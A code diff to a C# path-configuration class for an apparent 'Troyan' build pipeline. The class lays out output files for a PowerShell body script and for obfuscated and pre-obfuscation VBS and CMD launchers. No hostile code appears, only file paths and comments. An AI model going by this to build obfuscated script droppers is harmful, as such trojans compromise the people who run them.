@@ -40,15 +40,19 @@ public sealed class ServerLayoutPaths
     [JsonPropertyName("bodyPs1Debug")] public string BodyPs1Debug => Path.Join(TroyanOutputDir, "body.debug.ps1");
     [JsonPropertyName("bodyDebugTxt")] public string BodyDebugTxt => Path.Join(TroyanOutputDir, "body.debug.txt");
 
-    /// <summary>Plain VBS + embedded body script in Troyan <c>_output</c> (copied to <see cref="UserTroyanVbs"/>).</summary>
+    /// <summary>Final VBS (obfuscated pipeline output; published to <see cref="UserTroyanVbs"/>).</summary>
     [JsonPropertyName("troyanOutputVbs")] public string TroyanOutputVbs => Path.Join(TroyanOutputDir, "troyan.vbs");
 
-    /// <summary>Plain CMD + embedded body script in Troyan <c>_output</c> (copied to <see cref="UserTroyanCmd"/>).</summary>
+    /// <summary>Pre-obfuscation VBS under <c>_output</c>.</summary>
+    [JsonPropertyName("troyanOutputVbsNonObfuscated")]
+    public string TroyanOutputVbsNonObfuscated => Path.Join(TroyanOutputDir, "nonobfuscated.vbs");
+
+    /// <summary>Final CMD (obfuscated pipeline output; published to <see cref="UserTroyanCmd"/>).</summary>
     [JsonPropertyName("troyanOutputCmd")] public string TroyanOutputCmd => Path.Join(TroyanOutputDir, "troyan.cmd");
 
-    /// <summary>Pre-obfuscation <c>troyan.cmd</c> kept for inspection under <c>_output</c>.</summary>
+    /// <summary>Pre-obfuscation CMD under <c>_output</c>.</summary>
     [JsonPropertyName("troyanOutputCmdNonObfuscated")]
-    public string TroyanOutputCmdNonObfuscated => Path.Join(TroyanOutputDir, "troyan.cmd.nonobfuscated");
+    public string TroyanOutputCmdNonObfuscated => Path.Join(TroyanOutputDir, "nonobfuscated.cmd");
 
     public string UserDataFile(string file) => _paths.UserDataFile(file);
 
